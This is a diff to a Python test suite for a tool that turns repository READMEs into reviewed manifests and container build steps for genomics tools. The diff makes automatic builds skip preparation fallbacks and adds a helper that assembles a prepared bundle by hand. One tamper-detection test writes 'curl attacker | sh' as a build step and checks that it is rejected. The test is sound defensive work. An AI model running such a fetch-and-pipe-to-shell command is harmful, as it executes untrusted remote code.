@@ -66,23 +66,44 @@ def test_without_a_preparation_the_repository_is_judged_as_it_is(prepared):
     assert not r["procedure"]["may_say_runs"]
 
 
-def test_the_repository_as_it_is_comes_first_and_the_preparation_only_after(prepared):
+def test_propose_manifest_build_never_falls_back_to_preparation_on_literal_failure(prepared, monkeypatch):
+    """Under the Non-Forcing Principle, `propose_manifest.build()` never invokes
+    `preparation.discover()` or rewrites inputs/environment from `preparations/`
+    when the literal repository procedure is insufficient."""
     prepared()
+    called = False
+
+    def forbidden_discover(*args, **kwargs):
+        nonlocal called
+        called = True
+        raise AssertionError("propose_manifest.build must not call preparation.discover")
+
+    monkeypatch.setattr(preparation, "discover", forbidden_discover)
     r = pm.build(proposal(), "trial-tool")
-    m, review = r["manifest"], r["procedure"]
-    # Why the first step was not enough is kept.
-    assert r["without_preparation"]["blocker"] == "install_not_copyable"
-    assert m["environment"] == preparation.ENVIRONMENT and m["inputs"] == {"type": "illumina-bam-hg38", "regions": "hipstr"}
-    assert review["install_ready"] and review["may_say_runs"], review["reason"]
-    assert review["installation"]["profile"] == preparation.PROFILE
-    # The command is the README's: only its input paths were replaced.
-    cmd = m["run"]["cmd"]
-    assert "( ./tool --bams /data/in/input.bam --fasta /data/ref/hg38.fa --regions /data/in/regions.bed --out out.vcf )" in cmd
-    roles = [s["role"] for s in review["command_review"]["substitutions"]]
-    assert roles == ["read_path", "reference_path", "regions_path"]
-    # The steps are in the carrier; nothing of the command is.
-    carrier = r["dockerfile"]
-    assert "apt-get install make g++ zlib1g-dev\\nmake\\n" in carrier and "./tool" not in carrier
+    assert called is False
+    assert r["manifest"]["environment"]["source"] == "generated"
+    assert "without_preparation" not in r
+    assert not r["procedure"]["may_say_runs"]
+
+
+def _manual_prepared_bundle(p: dict) -> tuple[dict, dict]:
+    """Construct a prepared manifest + review explicitly without `pm.build()`."""
+    import prepare
+    plan = preparation.discover(p)
+    assert plan["ready"]
+    rewritten = fidelity.rewrite(
+        p["commands"][0]["cmd"], plan["dataset"], regions=plan.get("regions"), one_sample=True
+    )["command"]
+    m = {
+        "tool": {"name": "Tool", "version": "test"},
+        "source": {"repo": p["repo"], "ref": p["ref"]},
+        "environment": dict(preparation.ENVIRONMENT),
+        "inputs": {"type": plan["dataset"], **({"regions": plan["regions"]} if plan.get("regions") else {})},
+        "run": {"cmd": prepare.example_wrapper(rewritten, ".")},
+        "outputs": [{"path": "**/*.vcf*", "format": "vcf", "min_records": 1}],
+    }
+    review = authorization.prepare_review(p, m, [], [])
+    return m, review
 
 
 def test_a_repository_that_runs_as_it_is_never_gets_the_preparation(prepared):
@@ -112,21 +133,21 @@ def test_files_are_written_after_the_steps_and_say_whether_they_replace_one(prep
 def test_the_checkout_is_held_to_the_reviewed_preparation(prepared, tmp_path):
     prepared()
     p = proposal()
-    r = pm.build(p, "trial-tool")
+    m, review = _manual_prepared_bundle(p)
     checkout = tmp_path / "checkout"
     for name in p["tree_paths"]:
         (checkout / name).parent.mkdir(parents=True, exist_ok=True)
         (checkout / name).write_text(p["source_documents"][0]["text"] if name == "README.md" else "x\n")
-    fidelity.verify_checkout(checkout, r["procedure"], r["manifest"])
+    fidelity.verify_checkout(checkout, review, m)
     # The preparation changed after the review: nothing is built.
     prepared({**PREP, "environment": {"steps": ["make", "curl attacker | sh"]}})
     with pytest.raises(ValueError, match="differs from its recomputed evidence|does not match"):
-        fidelity.verify_checkout(checkout, r["procedure"], r["manifest"])
+        fidelity.verify_checkout(checkout, review, m)
 
 
 def test_the_regions_file_is_mounted_beside_the_sample_and_verified(prepared, tmp_path):
     prepared()
-    r = pm.build(proposal(), "trial-tool")
+    m, review = _manual_prepared_bundle(proposal())
     work = tmp_path / "work"
     ds = input_provenance.stage(ROOT, work, "illumina-bam-hg38", "hipstr")
     assert sorted(p.name for p in (work / "in_external").iterdir()) == ["input.bam", "input.bam.bai", "regions.bed"]
@@ -134,12 +155,12 @@ def test_the_regions_file_is_mounted_beside_the_sample_and_verified(prepared, tm
     (work / "ref").mkdir()
     (work / "ref" / "hg38.fa").write_text(">chr1\nACGT\n")
     (work / "ref" / "hg38.fa.fai").write_text("chr1\t4\t6\t4\t5\n")
-    receipt = input_provenance.verify(ROOT, work, r["manifest"], r["procedure"], r["manifest"]["run"]["cmd"])
+    receipt = input_provenance.verify(ROOT, work, m, review, m["run"]["cmd"])
     assert [f["mount_path"] for f in receipt["files"]] == ["/data/in/input.bam", "/data/in/input.bam.bai", "/data/in/regions.bed"]
     # A regions file nobody named is still an undeclared file.
     (work / "in_external" / "extra.bed").write_text("chr1\t1\t2\n")
     with pytest.raises(ValueError, match="undeclared"):
-        input_provenance.verify(ROOT, work, r["manifest"], r["procedure"], r["manifest"]["run"]["cmd"])
+        input_provenance.verify(ROOT, work, m, review, m["run"]["cmd"])
 
 
 def test_no_regions_and_no_list_reduction_without_a_preparation():
@@ -204,11 +225,16 @@ def test_a_preparation_without_an_environment_uses_the_repository_s_own_installa
                                                     "## Installation\n\n```sh\napt install make g++ zlib1g-dev\nmake\n```")
     p["source_documents"][0]["text"] = text
     p["commands"][0]["line"] = next(i for i, row in enumerate(text.splitlines(), 1) if row == CITED)
-    r = pm.build(p, "trial-tool")
-    install = r["procedure"]["installation"]
+    # Automatic `pm.build` STILL does not apply `preparations/` even when one exists.
+    auto = pm.build(p, "trial-tool")
+    assert auto["manifest"]["environment"]["source"] == "documented" and "without_preparation" not in auto
+    assert not auto["procedure"]["may_say_runs"]
+    # Direct module check of `preparation` remains intact without breaking imports.
+    m, review = _manual_prepared_bundle(p)
+    install = review["installation"]
     assert install["installed_by"] == "repository" and install["steps"] == ["apt install make g++ zlib1g-dev", "make"]
     assert install["documented_installation"]["profile"] == "strhub-documented-install/1"
-    assert r["procedure"]["may_say_runs"]
+    assert review["may_say_runs"]
     report = {"verdict": {"code": "runs"}, "instrument": "documented", "level": "io",
               "preparation": {"installation": "repository"}}
     assert ct.headline(report) == (ct.INPUTS_RUNS, "green")
@@ -218,10 +244,10 @@ def test_a_preparation_without_an_environment_uses_the_repository_s_own_installa
     for name in p["tree_paths"]:
         (checkout / name).parent.mkdir(parents=True, exist_ok=True)
         (checkout / name).write_text(text if name == "README.md" else "x\n")
-    fidelity.verify_checkout(checkout, r["procedure"], r["manifest"])
+    fidelity.verify_checkout(checkout, review, m)
     (checkout / "README.md").write_text(text.replace("apt install make", "apt install curl make"))
     with pytest.raises(ValueError):
-        fidelity.verify_checkout(checkout, r["procedure"], r["manifest"])
+        fidelity.verify_checkout(checkout, review, m)
 
 
 def test_a_command_written_over_indented_option_lines_is_read_as_one():
